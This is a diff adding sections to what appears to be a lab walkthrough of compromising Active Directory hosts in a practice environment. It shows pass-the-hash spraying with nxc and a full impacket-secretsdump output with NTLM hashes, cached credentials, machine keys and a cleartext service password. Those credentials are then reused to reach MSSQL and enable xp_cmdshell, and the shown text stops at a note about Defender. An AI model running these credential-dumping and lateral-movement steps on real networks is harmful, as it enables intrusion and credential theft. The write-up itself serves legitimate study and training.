@@ -302,4 +302,85 @@ Now wait a few minutes for the scheduled task to run
 
 ## WINTERFELL HAS FALLEN
 
+# CASTELBLACK
+
+```
+nxc smb ips.txt -u users.txt -H winterfell_hashes.txt --no-bruteforce --continue-on-success
+```
+
+<img width="1396" height="350" alt="image" src="https://github.com/user-attachments/assets/110c3af4-dad8-4ab5-82f2-53f8b6521a96" />
+
+```
+impacket-secretsdump 'north/eddard.stark'@192.168.56.22 -hashes :d977b98c6c9282c5c478be1d97b237b8
+```
+
+```
+impacket-secretsdump 'north/eddard.stark'@192.168.56.22 -hashes :d977b98c6c9282c5c478be1d97b237b8
+Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Service RemoteRegistry is in stopped state
+[*] Starting service RemoteRegistry
+[*] Target system bootKey: 0xdd8b647167bf771c7354812437076e03
+[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:dbd13e1c4e338284ac4e9874f7de6ef4:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:4363b6dc0c95588964884d7e1dfea1f7:::
+vagrant:1000:aad3b435b51404eeaad3b435b51404ee:e02bc503339d51f71d913c245d35b50b:::
+[*] Dumping cached domain logon information (domain/username:hash)
+NORTH.SEVENKINGDOMS.LOCAL/sql_svc:$DCC2$10240#sql_svc#89e701ebbd305e4f5380c5150494584a: (2025-08-22 16:06:41+00:00)
+NORTH.SEVENKINGDOMS.LOCAL/robb.stark:$DCC2$10240#robb.stark#f19bfb9b10ba923f2e28b733e5dd1405: (2025-08-22 17:12:30+00:00)
+[*] Dumping LSA Secrets
+[*] $MACHINE.ACC 
+NORTH\CASTELBLACK$:aes256-cts-hmac-sha1-96:7f280145c7e3bf1dcc7b833d4d07099bc3e61e55f09b966ac5e8d694f542a8c9
+NORTH\CASTELBLACK$:aes128-cts-hmac-sha1-96:9a171d4c984425f30991cdbee5355b47
+NORTH\CASTELBLACK$:des-cbc-md5:835ee5073e3b8964
+NORTH\CASTELBLACK$:plain_password_hex:2c01932d67ac0d39e7213c95f3db76647634d04598f410178fb089c65ca03bcb4862a529358e94501e750bc03aa0bdbe3c2faea02ec8ec50f6b27f63cf1578ed2ac1fbd2e00a452aa3b8b79e696feb8757e394bbe790709f961dfb81146b760cb42bebd74b35455d6f487b3722203fc688ab459a6723ba1951e4bdd2832595a40f0a025a24ec8a12d247de9ad147ee7f917acc5aa1135ef0d1067346823ba788d9dbfb8f599dd6def4cb22344cbf50dacf2b300573cf7d763d192c38f03c662d028f750eb81faa2672eceff68b6db86f4391136a1f54a78118fc2779c2b1f95ca46e6beb9c75f45e566a22bec405176f
+NORTH\CASTELBLACK$:aad3b435b51404eeaad3b435b51404ee:033f0f25d9c3f2ae055f2d429c8a4fa2:::
+[*] DPAPI_SYSTEM 
+dpapi_machinekey:0xdb6bd656c8ffbdfaca3f9c2a77471e734b070108
+dpapi_userkey:0xd977fe9e8e5772842dd418750eaf16dfd8823eb1
+[*] NL$KM 
+ 0000   22 34 01 76 01 70 30 93  88 A7 6B B2 87 43 59 69   "4.v.p0...k..CYi
+ 0010   0E 41 BD 22 0A 0C CC 23  3A 5B B6 74 CB 90 D6 35   .A."...#:[.t...5
+ 0020   14 CA D8 45 4A F0 DB 72  D5 CF 3B A1 ED 7F 3A 98   ...EJ..r..;...:.
+ 0030   CD 4D D6 36 6A 35 24 2D  A0 EB 0F 8E 3F 52 81 C9   .M.6j5$-....?R..
+NL$KM:223401760170309388a76bb2874359690e41bd220a0ccc233a5bb674cb90d63514cad8454af0db72d5cf3ba1ed7f3a98cd4dd6366a35242da0eb0f8e3f5281c9
+[*] _SC_MSSQL$SQLEXPRESS 
+north.sevenkingdoms.local\sql_svc:YouWillNotKerboroast1ngMeeeeee
+[*] Cleaning up... 
+[*] Stopping service RemoteRegistry
+```
+
+Notice the following
+
+```
+north.sevenkingdoms.local\sql_svc:YouWillNotKerboroast1ngMeeeeee
+```
+
+## CASTELBLACK HAS FALLEN
+
+# BRAVOOS
+
+
+```
+impacket-mssqlclient essos.local/sql_svc:YouWillNotKerboroast1ngMeeeeee@192.168.56.23 -windows-auth
+```
+
+```
+enable_xp_cmdshell
+```
+
+<img width="1453" height="640" alt="image" src="https://github.com/user-attachments/assets/b5e5027b-4b93-44af-8bee-09fd148f3a83" />
+
+<img width="677" height="277" alt="image" src="https://github.com/user-attachments/assets/ad1c4787-c27f-4131-8bb0-cdc1b3133b6c" />
+
+<img width="524" height="172" alt="image" src="https://github.com/user-attachments/assets/266d26a7-b293-4abe-8273-bc31c673d05a" />
+
+Defender is on the system
+
+
+
+
+
 
